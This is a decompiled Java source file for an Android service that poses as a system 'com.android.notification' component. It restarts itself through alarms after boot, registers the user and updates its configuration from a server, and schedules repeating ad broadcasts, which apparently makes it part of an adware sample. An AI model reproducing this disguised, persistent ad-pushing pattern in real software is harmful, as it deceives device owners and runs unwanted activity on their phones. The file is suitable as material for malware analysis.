package com.android.notification;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import com.android.notification.configure.DownApkXmlKey;
import com.android.notification.configure.IntentFlag;
import com.android.notification.configure.WebFlag;
import com.android.notification.util.AppUtil;
import com.android.notification.util.Tool;

public class MainService extends Service {
    private static final String servicesClassName = "com.android.notification.MainService";
    private final String adAction = "android.alarm.notification.AD_pencilsketch";
    private AlarmManager adAlarm;
    private PendingIntent adAlarmIntent;
    private final String serviceAction = "android.alarm.notification.RESTART_SERVICE";
    private AlarmManager serviceAlarm;
    private PendingIntent serviceAlarmIntent;

    public IBinder onBind(Intent intent) {
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onBind  text:onBind");
        return null;
    }

    public void onCreate() {
        super.onCreate();
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onCreate  text:onCreate");
    }

    public void onStart(Intent intent, int startid) {
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:onStart");
        Intent intentService;
        if (intent != null) {
            String flag = intent.getStringExtra(IntentFlag.FLAG);
            if (flag == null) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:stop service as intent flag is null");
                intentService = new Intent();
                intentService.setAction(servicesClassName);
                stopService(intentService);
                return;
            } else if (flag.equals(IntentFlag.BOOT_START)) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:wait 5 mins to start service");
                onReStartServiceAlarm(300000);
                return;
            } else if (flag.equals(IntentFlag.APP_START)) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:wait 1 mins to start service");
                onReStartServiceAlarm(60000);
                return;
            } else if (flag.equals(IntentFlag.RESTART) || flag.equals(IntentFlag.TIMER_RESTART)) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:" + flag);
                AppUtil.Checkconfigfile(getApplicationContext(), intent);
                String webstatus = AppUtil.getWebStatus(getApplicationContext(), intent);
                if (Tool.isStrEmpty(webstatus) || webstatus.equals(WebFlag.NONET)) {
                    onStartAdAlarm((AppUtil.getTimerconfig().getAdPeriodTime() * 60) * 1000);
                    return;
                } else {
                    onPreUpDateTimerConfigfile(webstatus);
                    return;
                }
            } else {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:stop service as intent flag error");
                intentService = new Intent();
                intentService.setAction(servicesClassName);
                stopService(intentService);
                return;
            }
        }
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:stop service as intent is null");
        intentService = new Intent();
        intentService.setAction(servicesClassName);
        stopService(intentService);
    }

    public void onDestroy() {
        super.onDestroy();
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onDestroy  text:onDestroy");
        if (!(this.adAlarm == null || this.adAlarmIntent == null)) {
            Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onDestroy  text:stop push alarm");
            this.adAlarm.cancel(this.adAlarmIntent);
        }
        if (this.serviceAlarm != null && this.serviceAlarmIntent != null) {
            Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onDestroy  text:stop reStartService alarm");
            this.serviceAlarm.cancel(this.serviceAlarmIntent);
        }
    }

    private void onPreRegistrationUser(String webstatus) {
        try {
            if (!webstatus.equals(WebFlag.NONET)) {
                AppUtil.RegistrationUser();
            }
            onStartAdAlarm((AppUtil.getTimerconfig().getAdPeriodTime() * 60) * 1000);
        } catch (Exception ex) {
            ex.printStackTrace();
            Tool.JWDlogException(DownApkXmlKey.ROOT, "class:MainService  func:onPreRegistrationUser  text:message:", ex);
            onStartAdAlarm((AppUtil.getTimerconfig().getAdPeriodTime() * 60) * 1000);
        }
    }

    private void onPreUpDateTimerConfigfile(String webstatus) {
        try {
            if (!webstatus.equals(WebFlag.NONET)) {
                AppUtil.UpDateTimerConfigfile();
            }
            onPreRegistrationUser(webstatus);
        } catch (Exception e) {
            e.printStackTrace();
            Tool.JWDlogException(DownApkXmlKey.ROOT, "class:MainService  func:onPreUpDateTimerConfigfile  text:message:", e);
            onPreRegistrationUser(webstatus);
        }
    }

    private void onStartAdAlarm(int interval) {
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStartAdAlarm  text:onStartAdAlarm");
        Context context = getApplicationContext();
        this.adAlarm = (AlarmManager) context.getSystemService("alarm");
        this.adAlarmIntent = PendingIntent.getBroadcast(context, 0, new Intent("android.alarm.notification.AD_pencilsketch"), 268435456);
        this.adAlarm.setRepeating(0, System.currentTimeMillis() + 300000, (long) interval, this.adAlarmIntent);
    }

    private void onReStartServiceAlarm(int interval) {
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService func:onReStartServiceAlarm  text:onReStartServiceAlarm");
        Context context = getApplicationContext();
        this.serviceAlarm = (AlarmManager) context.getSystemService("alarm");
        this.serviceAlarmIntent = PendingIntent.getBroadcast(context, 0, new Intent("android.alarm.notification.RESTART_SERVICE"), 268435456);
        this.serviceAlarm.set(0, System.currentTimeMillis() + ((long) interval), this.serviceAlarmIntent);
    }
}
